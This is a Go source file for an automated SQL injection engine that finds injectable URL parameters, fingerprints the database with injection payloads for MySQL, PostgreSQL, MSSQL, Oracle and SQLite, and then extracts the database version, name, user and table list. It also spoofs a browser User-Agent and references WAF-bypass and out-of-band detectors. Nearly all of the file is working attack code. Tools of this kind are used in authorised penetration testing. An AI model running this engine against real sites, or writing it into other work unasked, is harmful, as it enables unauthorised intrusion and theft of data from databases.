package sqli

import (
	"fmt"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/angel-platform/angel/pkg/logger"
)

type SQLiEngine struct {
	config         *SQLiConfig
	logger         *logger.Logger
	httpClient     *http.Client
	results        chan *InjectionResult
	detectors      map[InjectionType]Detector
	wafBypass      *WBypassEngine
	scheduler      *Scheduler
	mu             sync.RWMutex
}

func NewSQLiEngine(config *SQLiConfig) *SQLiEngine {
	if config == nil {
		config = DefaultConfig()
	}

	log := logger.New("sqli-engine", logger.LevelInfo)
	engine := &SQLiEngine{
		config:    config,
		logger:    log,
		httpClient: config.HTTPClient,
		results:   make(chan *InjectionResult, 100),
		detectors: make(map[InjectionType]Detector),
		wafBypass: NewWAFBypassEngine(),
	}

	if engine.httpClient == nil {
		transport := &http.Transport{
			MaxIdleConns:        100,
			MaxIdleConnsPerHost: 100,
			IdleConnTimeout:     90 * time.Second,
		}
		if config.ProxyURL != "" {
			proxyURL, err := url.Parse(config.ProxyURL)
			if err == nil {
				transport.Proxy = http.ProxyURL(proxyURL)
			}
		}
		engine.httpClient = &http.Client{
			Transport: transport,
			Timeout:   config.Timeout,
		}
	}

	engine.registerDetectors()
	engine.scheduler = NewScheduler(engine)

	return engine
}

func (e *SQLiEngine) registerDetectors() {
	e.detectors[InjectionBooleanBlind] = NewBooleanBlindDetector(e)
	e.detectors[InjectionTimeBased] = NewTimeBasedDetector(e)
	e.detectors[InjectionErrorBased] = NewErrorBasedDetector(e)
	e.detectors[InjectionUnionBased] = NewUnionBasedDetector(e)
	e.detectors[InjectionStacked] = NewStackedDetector(e)
	e.detectors[InjectionOOBDNS] = NewOOBDNSDetector(e)
	e.detectors[InjectionOOBHTTP] = NewOOBHTTPDetector(e)
	e.detectors[InjectionOOBICMP] = NewOOBICMPDetector(e)
}

func (e *SQLiEngine) Scan(target string) (*ScanResult, error) {
	e.logger.Info("Starting SQLi scan on target: %s", target)

	result := &ScanResult{
		Target:    target,
		StartTime: time.Now(),
	}

	params := e.config.Params
	if len(params) == 0 {
		params = e.detectParameters(target)
	}

	if len(params) == 0 {
		e.logger.Warn("No parameters found for target: %s", target)
		result.Error = "no parameters found"
		result.EndTime = time.Now()
		result.Duration = result.EndTime.Sub(result.StartTime)
		return result, nil
	}

	e.logger.Info("Found %d parameters to test", len(params))

	for _, param := range params {
		injectionPoints := e.DetectInjectionPoint(target, []string{param})
		for _, pt := range injectionPoints {
			result.AddInjectionPoint(pt)
		}
	}

	if len(result.InjectionPoints) > 0 {
		result.DBMS = result.InjectionPoints[0].DBMS
		e.logger.Info("Found %d injection points", len(result.InjectionPoints))
	} else {
		e.logger.Info("No injection points found")
	}

	result.EndTime = time.Now()
	result.Duration = result.EndTime.Sub(result.StartTime)

	return result, nil
}

func (e *SQLiEngine) DetectInjectionPoint(urlStr string, params []string) []*InjectionPoint {
	var points []*InjectionPoint

	techniques := e.scheduler.ScheduleTechniques(urlStr)

	for _, tech := range techniques {
		detector, ok := e.detectors[tech.Type]
		if !ok {
			continue
		}

		tech.Status = TechniqueStatusRunning
		start := time.Now()

		result, err := detector.Detect(urlStr, params)
		tech.Duration = time.Since(start)

		if err != nil {
			tech.Status = TechniqueStatusFailed
			tech.Error = err.Error()
			e.logger.Error("Detector %s failed: %v", tech.Name, err)
			continue
		}

		if result.Found {
			tech.Status = TechniqueStatusCompleted
			tech.Result = result
			dbms := e.fingerprintDBMS(urlStr, params[0], result)

			pt := &InjectionPoint{
				URL:           urlStr,
				Parameter:     params[0],
				Location:      ParamQuery,
				InjectionType: result.Type,
				DBMS:          dbms,
				Payload:       result.Payload,
				Evidence:      result.Evidence,
				Confidence:    result.Confidence,
				Severity:      result.Severity,
				Details:       result.Details,
			}
			points = append(points, pt)
			e.logger.Info("Found injection: %s on param %s (%s)", result.Type, params[0], dbms)
		} else {
			tech.Status = TechniqueStatusCompleted
		}
	}

	return points
}

func (e *SQLiEngine) Exploit(injection *InjectionPoint) (*ExploitResult, error) {
	if injection == nil {
		return nil, fmt.Errorf("injection point is nil")
	}

	e.logger.Info("Exploiting injection point: %s on %s", injection.InjectionType, injection.URL)

	gen := NewPayloadGenerator(injection.DBMS)
	result := &ExploitResult{
		Success:     true,
		InjectionPt: injection,
		DBMS:        injection.DBMS,
		Data:        make(map[string]string),
	}

	version, err := e.extractData(injection, gen.Version())
	if err == nil && version != "" {
		result.Version = version
		result.Data["version"] = version
	}

	db, err := e.extractData(injection, gen.Database())
	if err == nil && db != "" {
		result.Database = db
		result.Data["database"] = db
	}

	user, err := e.extractData(injection, gen.User())
	if err == nil && user != "" {
		result.User = user
		result.Data["user"] = user
	}

	if result.Database != "" {
		tablesPayload := gen.ListTables(result.Database)
		tablesRaw, err := e.extractData(injection, tablesPayload)
		if err == nil && tablesRaw != "" {
			tables := strings.Split(tablesRaw, "\n")
			result.Tables = tables
		}
	}

	e.logger.Info("Exploitation complete: version=%s db=%s user=%s",
		result.Version, result.Database, result.User)

	return result, nil
}

func (e *SQLiEngine) extractData(injection *InjectionPoint, payload string) (string, error) {
	gen := NewPayloadGenerator(injection.DBMS)
	_ = gen

	params := map[string]string{injection.Parameter: payload}

	req, err := http.NewRequest("GET", injection.URL, nil)
	if err != nil {
		return "", fmt.Errorf("create request: %w", err)
	}

	q := req.URL.Query()
	for k, v := range params {
		q.Set(k, v)
	}
	req.URL.RawQuery = q.Encode()

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	for k, v := range e.config.CustomHeaders {
		req.Header.Set(k, v)
	}

	resp, err := e.httpClient.Do(req)
	if err != nil {
		return "", fmt.Errorf("execute request: %w", err)
	}
	defer resp.Body.Close()

	body := make([]byte, 0)
	buf := make([]byte, 4096)
	for {
		n, err := resp.Body.Read(buf)
		body = append(body, buf[:n]...)
		if err != nil {
			break
		}
	}

	return e.extractValueFromResponse(string(body), injection.InjectionType)
}

func (e *SQLiEngine) extractValueFromResponse(body string, itype InjectionType) (string, error) {
	switch itype {
	case InjectionErrorBased:
		re := regexp.MustCompile("~(.+?)~")
		matches := re.FindStringSubmatch(body)
		if len(matches) > 1 {
			return matches[1], nil
		}
	case InjectionUnionBased:
		return body, nil
	case InjectionBooleanBlind:
		return body, nil
	default:
		return body, nil
	}
	return "", nil
}

func (e *SQLiEngine) fingerprintDBMS(urlStr, param string, result *InjectionResult) DBMSType {
	if e.config.DBMS != DBMSUnknown {
		return e.config.DBMS
	}

	gen := NewPayloadGenerator(DBMSUnknown)
	_ = gen

	dbmsTests := []struct {
		dbms    DBMSType
		payload string
		pattern string
	}{
		{DBMSMySQL, "' AND (SELECT version())--", "MySQL"},
		{DBMSPostgres, "' AND (SELECT version())--", "PostgreSQL"},
		{DBMSMSSQL, "' AND (SELECT @@version)--", "Microsoft"},
		{DBMSOracle, "' AND (SELECT banner FROM v$version WHERE ROWNUM=1)--", "Oracle"},
		{DBMSSQLite, "' AND (SELECT sqlite_version())--", "SQLite"},
	}

	for _, test := range dbmsTests {
		resp, err := e.makeFingerprintRequest(urlStr, param, test.payload)
		if err != nil {
			continue
		}
		if strings.Contains(resp.Body, test.pattern) {
			e.logger.Info("Fingerprinted DBMS: %s", test.dbms)
			return test.dbms
		}
	}

	if result != nil && result.Details != nil {
		if pattern, ok := result.Details["error_pattern"]; ok {
			switch {
			case strings.Contains(pattern, "MySQL"):
				return DBMSMySQL
			case strings.Contains(pattern, "PostgreSQL"):
				return DBMSPostgres
			case strings.Contains(pattern, "ORA-"):
				return DBMSOracle
			case strings.Contains(pattern, "Microsoft"):
				return DBMSMSSQL
			case strings.Contains(pattern, "SQLite"):
				return DBMSSQLite
			}
		}
	}

	return DBMSUnknown
}

func (e *SQLiEngine) makeFingerprintRequest(targetURL, param, payload string) (*HTTPResponse, error) {
	parsed, err := url.Parse(targetURL)
	if err != nil {
		return nil, err
	}

	values := parsed.Query()
	values.Set(param, payload)
	parsed.RawQuery = values.Encode()

	req, err := http.NewRequest("GET", parsed.String(), nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")

	start := time.Now()
	resp, err := e.httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body := make([]byte, 0)
	buf := make([]byte, 4096)
	for {
		n, err := resp.Body.Read(buf)
		body = append(body, buf[:n]...)
		if err != nil {
			break
		}
	}

	return &HTTPResponse{
		StatusCode: resp.StatusCode,
		Body:       string(body),
		Length:     len(body),
		Timing:     time.Since(start),
	}, nil
}

func (e *SQLiEngine) detectParameters(targetURL string) []string {
	parsed, err := url.Parse(targetURL)
	if err != nil {
		return nil
	}

	params := make([]string, 0)
	for k := range parsed.Query() {
		params = append(params, k)
	}

	commonParams := []string{"id", "page", "search", "q", "user", "name", "cat", "item", "sort", "order"}
	for _, p := range commonParams {
		found := false
		for _, existing := range params {
			if existing == p {
				found = true
				break
			}
		}
		if !found {
			params = append(params, p)
		}
	}

	return params
}

func (e *SQLiEngine) GetDetectors() map[InjectionType]Detector {
	e.mu.RLock()
	defer e.mu.RUnlock()
	return e.detectors
}

func (e *SQLiEngine) GetWAFBypass() *WBypassEngine {
	return e.wafBypass
}

func (e *SQLiEngine) Close() {
	close(e.results)
}
